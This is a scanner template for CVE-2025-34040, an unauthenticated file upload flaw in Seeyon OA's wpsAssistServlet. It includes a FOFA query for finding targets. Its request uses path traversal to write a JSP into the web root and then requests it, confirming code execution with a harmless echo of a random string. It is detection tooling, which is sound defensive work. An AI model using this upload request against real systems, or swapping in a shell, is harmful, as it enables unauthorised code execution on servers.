id: CVE-2025-34040

info:
  name: 致远OA wpsAssistServlet 任意文件上传漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |
    An arbitrary file upload vulnerability exists in the Zhiyuan OA platform 5.0, 5.1 - 5.6sp1, 6.0 - 6.1sp2, 7.0, 7.0sp1 - 7.1, 7.1sp1, and 8.0 - 8.0sp2 via the wpsAssistServlet interface. The realFileType and fileId parameters are improperly validated during multipart file uploads, allowing unauthenticated attackers to upload crafted JSP files outside of intended directories using path traversal. Successful exploitation enables remote code execution as the uploaded file can be accessed and executed through the web server.
    fofa: app="致远互联-OA" && title="V8.0SP2"
  tags: seeyon,oa,cve,cve2025
  created: 2026/01/20
  requires: [seeyon]
  requires-mode: opportunistic

set:
  rboundary: randomLowercase(8)
  rbody: randomLowercase(16)
  filename: randomLowercase(10)
rules:
  r0:
    request:
      method: POST
      path: /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{filename}}.jsp&fileId=2
      headers:
        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
      body: |
        --WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="upload"; filename="123.xls"
        Content-Type: application/vnd.ms-excel

        <%@ page import="java.util.Base64" %><%= new String(Base64.getDecoder().decode("{{base64(rbody)}}"), "UTF-8") %>
        --WebKitFormBoundary{{rboundary}}--
    expression: response.body.bcontains(b'"success":true') && response.body.bcontains(b'officeTransResultFlag')
  r1:
    request:
      method: GET
      path: /{{filename}}.jsp
    expression: response.body.bcontains(bytes(rbody))
expression: r0() && r1()
